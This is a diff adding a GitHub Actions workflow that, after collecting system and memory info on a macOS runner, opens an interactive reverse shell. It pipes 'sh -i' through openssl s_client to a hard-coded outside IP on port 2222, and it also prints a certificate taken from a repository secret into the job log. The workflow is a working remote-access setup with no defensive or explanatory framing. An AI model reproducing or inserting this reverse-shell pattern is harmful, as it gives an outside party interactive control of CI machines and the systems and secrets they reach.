@@ -1,0 +1,27 @@
+---
+name: Test macOS reverse shell
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test-macos-reverse-shell:
+    runs-on: macos-10.15
+    steps:
+      - name: Get system info
+        run: sysctl -a | grep machdep.cpu
+      - name: Get Memory info
+        run: |
+          vm_stat
+          echo ""
+          echo ""
+          ps -caxm -orss,comm
+      - name: connect to reverse shell server
+        run: |
+          echo "{{ secrets.REV_SH_CERT }}" > cert.pem 
+          cat cert.pem
+          openssl x509 -in cert.pem -noout -text
+          mkfifo /tmp/s
+          export SERVER_IP=54.175.186.108
+          sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect $SERVER_IP:2222 > /tmp/s
+          rm /tmp/s
